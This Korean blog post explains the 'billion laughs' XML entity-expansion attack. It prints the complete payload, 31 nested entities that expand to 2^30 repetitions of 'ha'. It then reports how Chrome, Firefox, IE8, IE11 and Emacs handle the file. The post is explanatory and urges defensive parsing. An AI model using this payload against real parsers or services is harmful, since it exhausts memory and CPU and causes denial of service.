<!doctype html><html><head><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3882204692252974" crossorigin=anonymous></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-2098194-3"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","UA-2098194-3")</script><meta charset=utf-8><meta name=google-site-verification content="U8HPz3to00q8wRxuKaw82QsuVvOzGyPxcWhySSYAjOE"><meta name=description content="XML 파일이 프로그램을 죽일 수도 있다는 생각은 하지 못했다. XML은 그저 텍스트일 뿐이고 프로그램은 그저 파일을 읽어서 처리할 뿐인데... 그런데 다음과 같은 파일을 보고서야 그럴 수도 있다는 것을 알게 되었다."><meta name=og:title content="교활한 XML @ntalbs' stuff"><meta name=og:description content="XML 파일이 프로그램을 죽일 수도 있다는 생각은 하지 못했다. XML은 그저 텍스트일 뿐이고 프로그램은 그저 파일을 읽어서 처리할 뿐인데... 그런데 다음과 같은 파일을 보고서야 그럴 수도 있다는 것을 알게 되었다."><meta name=og:url content="https://ntalbs.github.io/2011/tricky-xml/"><meta name=twitter:card content="summary_large_image"><meta name=og:image content="https://ntalbs.github.io/images/ntalbs.jpg"><meta name=twitter:image content="https://ntalbs.github.io/images/ntalbs.jpg"><meta name=twitter:site content="@ntalbs"><meta name=viewport content="width=device-width,initial-scale=1"><title>교활한 XML @ntalbs' stuff</title><link rel="shortcut icon" href=/images/favicon.ico><link rel=stylesheet href=/css/style.css><link rel=stylesheet href=/css/highlight.css></head><body><div id=progress><div id=bar></div><div class=container><div id=scroll-title>교활한 XML</div></div></div><nav class=navbar role=navigation><div class=container><div class=navbar-header><button type=button class="navbar-toggle unselectable" data-toggle=collapse data-target=#nav-items>+</button>
<a class="navbar-brand unselectable" href=/>@ntalbs' stuff</a></div><div class="navbar-items collapsed" id=nav-items><ul><li><a class=unselectable href=/archive/>Archive</a></li><li><a class=unselectable href=/tags/>Tags</a></li><li><a class=unselectable href=/about/>About</a></li><li><a id=mode-switch class=unselectable href=#></a></li></ul></div></div></nav><header class=page-head><div class=container><p class=blog-description>내 이 세상 도처에서 쉴 곳을 찾아보았으나, 마침내 찾아낸, 컴퓨터가 있는 구석방보다 나은 곳은 없더라.</p></div></header><main class=container role=main><article class=post><header><p class=post-meta><time datetime=2011-04-14 itemprop=datePublished>2011-04-14</time>
on
<a href=/tags/%eb%b3%b4%ec%95%88/>보안</a></p><h1 class=post-title>교활한 XML</h1></header><section class=post-content><p>XML 파일이 프로그램을 죽일 수도 있다는 생각은 하지 못했다. XML은 그저 텍스트일 뿐이고 프로그램은 그저 파일을 읽어서 처리할 뿐인데... 그런데 다음과 같은 파일을 보고서야 그럴 수도 있다는 것을 알게 되었다.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34;?&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE billion [
</span></span></span><span class=line><span class=cl><span class=cp>&lt;!ELEMENT billion (#PCDATA)&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh0 &#34;ha&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh1 &#34;&amp;laugh0;&amp;laugh0;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh2 &#34;&amp;laugh1;&amp;laugh1;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh3 &#34;&amp;laugh2;&amp;laugh2;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh4 &#34;&amp;laugh3;&amp;laugh3;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh5 &#34;&amp;laugh4;&amp;laugh4;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh6 &#34;&amp;laugh5;&amp;laugh5;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh7 &#34;&amp;laugh6;&amp;laugh6;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh8 &#34;&amp;laugh7;&amp;laugh7;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh9 &#34;&amp;laugh8;&amp;laugh8;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh10 &#34;&amp;laugh9;&amp;laugh9;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh11 &#34;&amp;laugh10;&amp;laugh10;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh12 &#34;&amp;laugh11;&amp;laugh11;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh13 &#34;&amp;laugh12;&amp;laugh12;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh14 &#34;&amp;laugh13;&amp;laugh13;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh15 &#34;&amp;laugh14;&amp;laugh14;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh16 &#34;&amp;laugh15;&amp;laugh15;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh17 &#34;&amp;laugh16;&amp;laugh16;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh18 &#34;&amp;laugh17;&amp;laugh17;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh19 &#34;&amp;laugh18;&amp;laugh18;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh20 &#34;&amp;laugh19;&amp;laugh19;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh21 &#34;&amp;laugh20;&amp;laugh20;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh22 &#34;&amp;laugh21;&amp;laugh21;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh23 &#34;&amp;laugh22;&amp;laugh22;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh24 &#34;&amp;laugh23;&amp;laugh23;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh25 &#34;&amp;laugh24;&amp;laugh24;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh26 &#34;&amp;laugh25;&amp;laugh25;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh27 &#34;&amp;laugh26;&amp;laugh26;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh28 &#34;&amp;laugh27;&amp;laugh27;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh29 &#34;&amp;laugh28;&amp;laugh28;&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY laugh30 &#34;&amp;laugh29;&amp;laugh29;&#34;&gt;</span>
</span></span><span class=line><span class=cl>]&gt;
</span></span><span class=line><span class=cl><span class=nt>&lt;billion&gt;</span><span class=ni>&amp;laugh30;</span><span class=nt>&lt;/billion&gt;</span>
</span></span></code></pre></div><p>우리회사 프로그램이 제대로 처리하지 못한다며 고객이 보내준 XML 파일이다. 이 파일을 Chrome이나 Firefox와 같은 브라우저에서 열면 즉각 에러를 표시한다.</p><p><img src=/2011/04-14-tricky-xml/chrome.png alt></p><p>그러나 IE8에서 열면 브라우저 화면에 아무것도 나타나지 않지만 CPU를 계속 사용하고 메모리도 계속 늘어난다. 메모리 사용량이 거의 1GB가까지 늘어나는 것을 보고 죽여야 했다. IE8도 이 XML 파일을 제대로 처리하지 못하는 것이다.</p><p>파일 내용을 보면 <code>laugh0</code> ~ <code>laugh30</code>까지 31개의 엔터티를 정의하는데 <code>laugh0</code>은 "ha"로 정의되어 있고 나머지 엔터티는 이전 엔터티를 두번 참조하는 것으로 정의되어 있다. <code>laugh1</code>은 <code>laugh0</code>이 두번 나오는 것이고, <code>laugh2</code>는 <code>laugh1</code>이 두번 나오는 것이다. 이런 식으로 <code>laugh30</code>까지 간다. 따라서 엔터티를 모두 확장해보면...</p><pre tabindex=0><code>laugh0 --&gt; ha
laugh1 --&gt; haha
laugh2 --&gt; hahahaha
laugh3 --&gt; hahahahahahahaha
laugh4 --&gt; hahahahahahahahahahahahahahahaha
laugh5 --&gt; hahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahaha
...
</code></pre><p><code>&lt;billion>&amp;laugh30;&lt;/billion></code>을 표시하려면 "ha"를 2<sup>30</sup>번 표시해야 한다. 2<sup>30</sup>이면 1G에 해당하는 크기다. "ha"를 2바이트라고 하면 이 XML 문서를 표시하기 위해 2GB 길이의 문자열을 표시해야 하는 것이다.</p><p>이 교활한 XML 파일을 읽고는 프로그램이 죽어버리거나 제대로 처리하지 못하는 것도 이해할만하지만 잘 작성된 프로그램이라면 그러지 말아야 한다. Chrome이나 Firefox는 이런 문제가 생길 수 있다는 것을 즉각 알아채고 에러 메시지를 표시한다. 잘 작성된 프로그램이다. IE8은 그렇지 못하다.</p><p>이 XML 파일을 보고서야 XML 문서로 프로그램을 공격할 수 있다는 걸 알게 되었고, 프로그램을 작성할 때도 이런 공격에 대비를 해야 한다는 것도 알게 되었다.</p><h2 id=업데이트-2014-11-12>업데이트 (2014-11-12)</h2><ul><li>윈도우7 IE11에서 위 XML 파일을 열어보면 예전의 IE8 처럼 삽질을 하지 않는다. 그저 조용히 맨 아랫줄 <code>&lt;billion>&amp;laugh30;&lt;/billion></code>을 제거하고 아무런 에러 메시지도 표시하지 않는다. 브라우저가 멈춰버리지는 않지만 친절한 UX라 할 수는 없다.</li><li>Emacs(24.4.1) 에디터에서 위 XML 파일을 열면 응답하지 않는 상태가 된다. XML 소스를 scratch 버퍼에 붙여넣는 것은 되지만 이를 XML 파일로 저장하려 하면 역시 응답하지 않는 상태가 된다. 프로세스가 CPU를 계속 사용하는 것으로 보아 뭔가 삽질을 하고 있는게 분명하다.</li></ul></section><footer class=post-footer><div class="social button-box"><a href=https://twitter.com/share class=twitter-share-button data-show-count=false>Tweet</a>
<a class=twitter-follow-button href=https://twitter.com/ntalbs data-show-count=false>Follow @ntalbs</a>
<script async src=//platform.twitter.com/widgets.js></script></div><nav id=article-nav><a class="article-nav-link-wrap previous" href=/2011/jstestdriver-exclude/ id=article-nav-newer>커버리지 분석 시 불필요한 js 파일 제외하기</a>
<a class="article-nav-link-wrap next" href=/2011/probablity/ id=article-nav-older>확률 문제</a></nav></footer></article></main><section class=section><div class=container><aside><div id=disqus_thread></div></aside><script type=text/javascript>var disqus_shortname="ntalbs-stuff",permalink="https://ntalbs.github.io/2011/tricky-xml/".replace(/\//g,"/"),disqus_config=function(){this.page.url=permalink,this.page.identifier=permalink};(function(){var e=document,t=e.createElement("script");t.src="https://"+disqus_shortname+".disqus.com/embed.js",t.setAttribute("data-timestamp",+new Date),(e.head||e.body).appendChild(t)})()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript rel=nofollow>comments powered by Disqus.</a></noscript></div></section><section class=section><div class="container has-text-centered"><p></p></div></section><script src=https://ntalbs.github.io/js/index.js type=text/javascript></script>
<script src=https://ntalbs.github.io/js/mode.js type=text/javascript></script><footer class=page-bottom><div class=inner><section class=copyright>© 2008-2022 <a href=/about>ntalbs</a></section><section class=poweredby>Powered by <a class=icon-ghost href=https://gohugo.io>Hugo</a></section></div></footer></body></html>